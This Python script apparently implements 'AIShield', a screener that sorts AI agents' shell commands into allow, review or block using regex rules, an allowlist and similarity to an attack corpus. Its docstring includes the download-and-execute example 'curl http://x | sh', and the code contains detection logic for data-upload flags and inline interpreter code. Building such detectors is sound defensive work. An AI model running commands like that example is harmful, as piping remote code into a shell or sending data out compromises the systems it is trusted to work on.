#!/usr/bin/env python3
"""
AIShield - screens shell commands proposed by an AI agent (Copilot, Cursor, Claude Code,
MCP tools, ...) and flags the ones that look attacker-driven, e.g. after a prompt injection.

Verdicts
  ALLOW   routine developer/agent work  (ls, cat README.md, ifconfig, git status, npm test ...)
  REVIEW  a human should look           (writes to system files, persistence-ish, resembles a known attack)
  BLOCK   known-malicious behaviour     (download+execute, reverse shell, credential theft, exfiltration ...)

How it decides (in order)
  1. Behaviour rules   - regexes for malicious *behaviour*, independent of exact wording.
  2. Routine allowlist - everyday read-only / dev commands that no rule flagged are ALLOWed.
  3. Similarity check  - only for the rest: TF-IDF similarity against the cleaned Atomic Red Team set,
                         compared with the benign set. Everyday commands never reach this step.

Data lives in files next to this script - nothing below is a hardcoded detection list:
  atomic_linux_commands.csv.gz    attack corpus (gzip); also supplies MITRE technique names
                                   (plain atomic_linux_commands.csv is read too, if present)
  benign_linux_commands.csv    normal agent commands; their verbs are also learned as "routine"
  rules.csv / rule_fragments.csv   behaviour rules (severity, MITRE id, reason, regex)
  routine_verbs.txt            extra everyday verbs to allow
  selftest_cases.csv           regression cases for --selftest

Usage
  python aishield_check.py                 interactive prompt (type 'quit' to exit)
  python aishield_check.py "ls -la"        check one command
  python aishield_check.py --json "cmd"    machine-readable output (exit code 2=BLOCK, 1=REVIEW, 0=ALLOW)
  python aishield_check.py --selftest      run built-in test cases
  python aishield_check.py --stats         show how the datasets were cleaned

Use from another script:
  from aishield_check import check
  result = check("curl http://x | sh")   ->  result.verdict, result.findings
"""
import argparse, csv, gzip, json, re, shlex, sys, unicodedata
from dataclasses import dataclass, field, asdict
from pathlib import Path

BASE = Path(__file__).resolve().parent
# the corpus is stored gzipped; a plain .csv dropped next to it works as a fallback.
# the generator writes into dataset\, so that folder is searched as well. Root wins
# (documented location), dataset\ is the fallback if the root copy is missing.
ATTACK_CSV = next((p for p in (BASE / "atomic_linux_commands.csv.gz",
                               BASE / "atomic_linux_commands.csv",
                               BASE / "dataset" / "atomic_linux_commands.csv.gz",
                               BASE / "dataset" / "atomic_linux_commands.csv") if p.exists()),
                  BASE / "atomic_linux_commands.csv.gz")
BENIGN_CSV = BASE / "benign_linux_commands.csv"
# authoritative MITRE ATT&CK technique-name lookup (active Enterprise techniques).
# the attack corpus only names ~118 IDs, so it is no longer the name source.
TECHNAMES_CSV = BASE / "dataset" / "attack_technique_names.csv"

ATTACK_THRESHOLD = 0.60   # min similarity to a known attack to raise a REVIEW
MARGIN = 0.15             # attack similarity must beat benign similarity by this much

csv.field_size_limit(10_000_000)


@dataclass
class Finding:
    severity: str
    rule: str
    mitre: str
    why: str


@dataclass
class Result:
    command: str
    verdict: str                      # ALLOW / REVIEW / BLOCK
    findings: list = field(default_factory=list)
    note: str = ""

    def to_dict(self):
        return asdict(self)


# --------------------------------------------------------------------------------------
# 1. Behaviour rules  (loaded from rules.csv + rule_fragments.csv)
# --------------------------------------------------------------------------------------
RULES_CSV = BASE / "rules.csv"
FRAGMENTS_CSV = BASE / "rule_fragments.csv"
ROUTINE_TXT = BASE / "routine_verbs.txt"
SELFTEST_CSV = BASE / "selftest_cases.csv"


def open_text(path):
    """Read a dataset as text; transparently handles .gz (our stored attack corpus)."""
    if str(path).endswith(".gz"):
        return gzip.open(path, mode="rt", newline="", encoding="utf-8-sig", errors="replace")
    return open(path, newline="", encoding="utf-8-sig", errors="replace")


def read_table(path, required):
    if not Path(path).exists():
        sys.exit(f"Missing data file: {Path(path).name} (it must sit next to aishield_check.py)")
    with open_text(path) as f:
        reader = csv.DictReader(f)
        missing = [c for c in required if c not in (reader.fieldnames or [])]
        if missing:
            sys.exit(f"{Path(path).name}: missing column(s) {missing}. Found: {reader.fieldnames}")
        return list(reader)


@dataclass
class Rule:
    sev: str        # CRITICAL / HIGH -> BLOCK, MEDIUM -> REVIEW
    rid: str
    mitre: str
    why: str
    local_exempt: bool
    rx: "re.Pattern"


def load_rules():
    frags = {r["name"]: r["pattern"] for r in read_table(FRAGMENTS_CSV, ["name", "pattern"])}
    rules = []
    for r in read_table(RULES_CSV, ["severity", "rule_id", "mitre", "why", "local_exempt", "pattern"]):
        sev = r["severity"].strip().upper()
        if sev not in SEV_ORDER:
            sys.exit(f"rules.csv: rule {r['rule_id']!r} has unknown severity {sev!r}")
        try:
            pat = re.sub(r"\{\{(\w+)\}\}", lambda m: frags[m.group(1)], r["pattern"])
            rules.append(Rule(sev, r["rule_id"], r["mitre"], r["why"],
                              r["local_exempt"].strip().lower() in ("yes", "true", "1"), re.compile(pat, re.I)))
        except (KeyError, re.error) as e:
            sys.exit(f"rules.csv: rule {r['rule_id']!r} is invalid: {e!r}")
    return rules


SEV_ORDER = {"CRITICAL": 3, "HIGH": 2, "MEDIUM": 1}
RULES = load_rules()

_TECH = None


def mitre_label(ids):
    """'T1105/T1059.004' -> 'T1105 Ingress Tool Transfer / T1059.004 Unix Shell'.

    Names come from dataset/attack_technique_names.csv (the full active ATT&CK
    set); the attack corpus only fills whatever gap remains.
    """
    global _TECH
    if _TECH is None:
        _TECH = {}
        if TECHNAMES_CSV.exists():
            for r in read_table(TECHNAMES_CSV, ["attack_technique", "technique_name"]):
                _TECH.setdefault(r["attack_technique"].strip(), r["technique_name"].strip())
        if ATTACK_CSV.exists():
            for r in read_table(ATTACK_CSV, ["attack_technique", "technique_name"]):
                _TECH.setdefault(r["attack_technique"].strip(), r["technique_name"].strip())
    return " / ".join(f"{t} {_TECH[t]}" if t in _TECH else t for t in ids.split("/"))


# --------------------------------------------------------------------------------------
# 2. Routine-command allowlist
# --------------------------------------------------------------------------------------
_ROUTINE = None


def routine_verbs():
    """routine_verbs.txt  +  every verb that appears in benign_linux_commands.csv."""
    global _ROUTINE
    if _ROUTINE is None:
        verbs = set()
        if ROUTINE_TXT.exists():
            for line in ROUTINE_TXT.read_text(encoding="utf-8", errors="replace").splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    verbs.add(line.lower())
        for r in read_table(BENIGN_CSV, ["command"]):
            for seg in all_segments(prep(r["command"])):
                v = segment_verb(seg)[0]
                if v:
                    verbs.add(v)
        _ROUTINE = verbs
    return _ROUTINE


WRAPPERS = {"sudo", "nohup", "time", "command", "nice", "ionice", "env", "timeout", "then", "else", "do", "!", "{", "(", "exec"}


def _tokens(seg):
    try:
        return shlex.split(seg, posix=True)
    except ValueError:
        return seg.split()


def segment_verb(seg):
    toks = _tokens(seg)
    i = 0
    while i < len(toks):
        t = toks[i]
        if re.fullmatch(r"[A-Za-z_]\w*=.*", t):
            i += 1
            continue
        base = t.rsplit("/", 1)[-1].lower()
        if base in WRAPPERS:
            i += 1
            if base == "sudo":
                while i < len(toks) and toks[i].startswith("-"):
                    i += 2 if toks[i] in ("-u", "-g", "-h", "-p", "-C", "-D", "-R", "-T") else 1
            elif base == "timeout":
                while i < len(toks) and toks[i].startswith("-"):
                    i += 1
                i += 1  # duration
            continue
        return base, toks[i + 1:]
    return "", []


def split_segments(cmd):
    """Split on ; | & && || newline while respecting quotes."""
    segs, buf, quote, i, n = [], [], None, 0, len(cmd)
    while i < n:
        ch = cmd[i]
        if quote:
            buf.append(ch)
            if ch == "\\" and quote == '"' and i + 1 < n:
                buf.append(cmd[i + 1]); i += 1
            elif ch == quote:
                quote = None
        elif ch in "'\"":
            quote = ch; buf.append(ch)
        elif ch == "\\" and i + 1 < n:
            buf.append(ch); buf.append(cmd[i + 1]); i += 1
        elif ch == "&" and ((i > 0 and cmd[i - 1] in "<>") or (i + 1 < n and cmd[i + 1] == ">")):
            buf.append(ch)  # 2>&1 / &> are redirections, not separators
        elif ch in ";|&\n":
            segs.append("".join(buf)); buf = []
            while i + 1 < n and cmd[i + 1] in ";|&":
                i += 1
        else:
            buf.append(ch)
        i += 1
    segs.append("".join(buf))
    return [s.strip() for s in segs if s.strip()]


SUBST = re.compile(r"\$\(([^()]*)\)|`([^`]*)`")


def all_segments(cmd):
    segs = split_segments(cmd)
    for a, b in SUBST.findall(cmd):
        segs += split_segments(a or b)
    return segs


def segment_is_routine(seg):
    verb, args = segment_verb(seg)
    if verb not in routine_verbs():
        return False
    joined = " ".join(args)
    if verb in ("curl", "wget", "http", "https", "httpie"):
        if re.search(r"(?:^|\s)(?:-d|--data\S*|-F|--form|-T|--upload-file|--post-file|--json|-X\s*(?:POST|PUT|PATCH|DELETE))(?:\s|=|$)", joined):
            return False
    if verb in ("awk", "gawk") and "system(" in joined:
        return False
    if verb == "xargs":
        rest = [a for a in args if not a.startswith("-")]
        return bool(rest) and rest[0].rsplit("/", 1)[-1].lower() in routine_verbs()
    if verb in ("ssh", "scp", "rsync"):
        return verb == "ssh" and not re.search(r"\s-\w*[RDL]\b", " " + joined)
    if verb in ("python", "python3", "node", "perl", "ruby", "php", "lua") and re.search(r"(?:^|\s)-[ce]\b", joined):
        return False  # inline code -> let the similarity step look at it
    return True


def prep(cmd):
    cmd = unicodedata.normalize("NFKC", cmd)
    cmd = re.sub(r"[\u200b-\u200f\u202a-\u202e\u2060\ufeff]", "", cmd)  # zero-width / bidi tricks
    return re.sub(r"[ \t]+", " ", cmd).strip()


LOCAL_HOSTS = {"localhost", "127.0.0.1", "0.0.0.0", "[::1]", "::1"}
TLD_HINT = re.compile(r"\b[a-z0-9-]+(?:\.[a-z0-9-]+)*\.(?:com|net|org|io|dev|app|xyz|ru|cn|top|info|sh|me|co|us|uk|de|tk|cc|onion)\b", re.I)


def only_local_targets(text):
    """True when every network target in the command is this machine (curl -d @x http://localhost:3000)."""
    hosts = re.findall(r"https?://(\[[^\]]+\]|[^/\s:'\"?#]+)", text, re.I)
    if hosts:
        return all(h.lower() in LOCAL_HOSTS for h in hosts)
    return bool(re.search(r"(?<![\w.@-])(?:localhost|127\.0\.0\.1)\b", text, re.I)) and not TLD_HINT.search(text)


def scan_rules(text):
    flat = text.replace("\n", " ; ")
    local = only_local_targets(flat)
    return [Finding(r.sev, r.rid, mitre_label(r.mitre), r.why) for r in RULES
            if r.rx.search(flat) and not (local and r.local_exempt)]


def is_routine(cmd):
    text = prep(cmd)
    return (not scan_rules(text)) and all(segment_is_routine(s) for s in all_segments(text))


# --------------------------------------------------------------------------------------
# 3. Datasets + similarity
# --------------------------------------------------------------------------------------
def norm_ml(c):
    c = c.lower()
    c = re.sub(r"#\{[^}]*\}|\$\{?pathtoatomicsfolder\}?", " argx ", c)
    c = re.sub(r"https?://[^\s|;&<>\"']+", " urlx ", c)
    c = re.sub(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", " ipx ", c)
    return re.sub(r"\s+", " ", c).strip()


def load_rows(path, required):
    with open_text(path) as f:
        reader = csv.DictReader(f)
        missing = [c for c in required if c not in (reader.fieldnames or [])]
        if missing:
            sys.exit(f"{Path(path).name}: missing column(s) {missing}. Found: {reader.fieldnames}")
        return [r for r in reader if (r.get("command") or "").strip()]


class Model:
    def __init__(self, attack_csv=ATTACK_CSV, benign_csv=BENIGN_CSV):
        from sklearn.feature_extraction.text import TfidfVectorizer
        self.stats = {}
        benign = load_rows(benign_csv, ["command"])
        raw_attack = load_rows(attack_csv, ["command", "attack_technique", "technique_name"])
        self.stats["attack_rows_raw"] = len(raw_attack)
        self.stats["benign_rows"] = len(benign)

        benign_norm = {norm_ml(r["command"]) for r in benign}
        seen, attack, dropped_routine, dropped_dup = set(), [], 0, 0
        for r in raw_attack:
            n = norm_ml(r["command"])
            if n in seen:
                dropped_dup += 1
                continue
            seen.add(n)
            # everyday commands (ls, whoami, ifconfig ...) are not attack signal for an AI agent
            if n in benign_norm or is_routine(r["command"]):
                dropped_routine += 1
                continue
            r["norm"] = n
            attack.append(r)
        self.stats.update(attack_rows_kept=len(attack), dropped_duplicates=dropped_dup,
                          dropped_routine_commands=dropped_routine)
        self.attack = attack
        for r in benign:
            r["norm"] = norm_ml(r["command"])
        self.benign = benign

        self.vec = TfidfVectorizer(token_pattern=r"[^\s|;&()\"'`$=,{}<>]+", ngram_range=(1, 2), sublinear_tf=True)
        self.vec.fit([r["norm"] for r in attack] + [r["norm"] for r in benign])
        self.A = self.vec.transform([r["norm"] for r in attack])
        self.B = self.vec.transform([r["norm"] for r in benign])

    def nearest(self, text):
        from sklearn.metrics.pairwise import cosine_similarity
        v = self.vec.transform([norm_ml(text)])
        a = cosine_similarity(v, self.A)[0]
        b = cosine_similarity(v, self.B)[0]
        i = int(a.argmax())
        return self.attack[i], float(a[i]), float(b.max())


_MODEL = None


def get_model():
    global _MODEL
    if _MODEL is None:
        _MODEL = Model()
    return _MODEL


# --------------------------------------------------------------------------------------
# Public API
# --------------------------------------------------------------------------------------
def check(cmd, model=None):
    text = prep(cmd)
    if not text:
        return Result(cmd, "ALLOW", note="empty command")

    findings = scan_rules(text)
    findings.sort(key=lambda f: -SEV_ORDER[f.severity])
    if any(SEV_ORDER[f.severity] >= 2 for f in findings):
        return Result(cmd, "BLOCK", findings)
    if findings:
        return Result(cmd, "REVIEW", findings)

    unknown = [s for s in all_segments(text) if not segment_is_routine(s)]
    if not unknown:
        return Result(cmd, "ALLOW", note="routine command, no malicious behaviour found")

    # similarity check, only for commands that are not plainly routine
    m = model or get_model()
    best = None
    for cand in [text] + unknown:
        match, a, b = m.nearest(cand)
        if best is None or a > best[1]:
            best = (match, a, b)
    match, a, b = best
    if a >= ATTACK_THRESHOLD and (a - b) >= MARGIN:
        f = Finding("MEDIUM", "similar-to-attack", mitre_label(match["attack_technique"]),
                    f"resembles known technique {match['attack_technique']} ({match['technique_name']}) "
                    f"[attack={a:.2f}, benign={b:.2f}]")
        return Result(cmd, "REVIEW", [f])
    return Result(cmd, "ALLOW", note=f"no known attack pattern [attack={a:.2f}, benign={b:.2f}]")


def format_result(r):
    lines = [f"Verdict : {r.verdict}"]
    if r.findings:
        lines.append(f"Risk    : {r.findings[0].severity}")
        for f in r.findings:
            lines.append(f"  - [{f.severity}] {f.why}\n      rule={f.rule}  MITRE {f.mitre}")
    if r.note:
        lines.append(f"Note    : {r.note}")
    return "\n".join(lines)


# --------------------------------------------------------------------------------------
# Self-test
# --------------------------------------------------------------------------------------
def run_selftest():
    m = get_model()
    cases = [(r["command"], r["expected"].strip().upper()) for r in read_table(SELFTEST_CSV, ["command", "expected"])]
    bad = 0
    for cmd, want in cases:
        got = check(cmd, m).verdict
        ok = got == want
        bad += not ok
        print(f"{'ok  ' if ok else 'FAIL'} want={want:6} got={got:6} {cmd[:90]}")
    print(f"\n{len(cases) - bad}/{len(cases)} passed")
    return 1 if bad else 0


def main():
    ap = argparse.ArgumentParser(description="Screen an AI agent's shell command.")
    ap.add_argument("command", nargs="*", help="command to check (omit for interactive mode)")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--stats", action="store_true")
    args = ap.parse_args()

    if args.selftest:
        sys.exit(run_selftest())
    if args.stats:
        print(json.dumps(get_model().stats, indent=2))
        return

    def run(c):
        r = check(c)
        print(json.dumps(r.to_dict(), indent=2) if args.json else format_result(r))
        return r

    if args.command:
        r = run(" ".join(args.command))
        sys.exit({"ALLOW": 0, "REVIEW": 1, "BLOCK": 2}[r.verdict])

    print("AIShield - type a command to check, or 'quit'.")
    while True:
        try:
            c = input("\nEnter command: ")
        except (EOFError, KeyboardInterrupt):
            break
        if c.strip().lower() in ("quit", "exit", "q"):
            break
        run(c)


if __name__ == "__main__":
    main()
